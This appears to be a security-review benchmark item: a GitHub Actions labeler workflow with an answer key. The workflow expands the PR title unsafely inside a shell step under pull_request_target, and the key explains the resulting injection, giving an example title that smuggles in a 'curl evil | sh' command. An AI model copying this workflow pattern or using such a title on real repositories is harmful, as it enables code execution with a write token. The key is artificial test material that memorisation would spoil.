pull_request.body: Switch to pull_request_target so labels can be added on PRs from forks, and add a `release` label when the title starts with `release:`.

e793dada474d7e78e79bdcb181a247732d8bc23d..github/workflows/labeler.yml:
name: PR labeler

on:
  pull_request_target:
    types: [opened, edited, synchronize]

permissions:
  contents: read
  pull-requests: write

jobs:
  label:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/labeler@8558fd74291d67161a8a78ce36a881fa63b766a9 # v5
      - name: Label release PRs
        env:
          GH_TOKEN: ${{ github.token }}
          PR_NUMBER: ${{ github.event.pull_request.number }}
        run: |
          title="${{ github.event.pull_request.title }}"
          if [[ "$title" == release:* ]]; then
            gh pr edit "$PR_NUMBER" --repo "$GITHUB_REPOSITORY" --add-label release
          fi

ground_truth.rationale: The expression is expanded before bash runs, so a fork PR titled 'x"; curl evil | sh; "' executes arbitrary commands in a pull_request_target job that has a write token. Pass the title through an env variable instead.
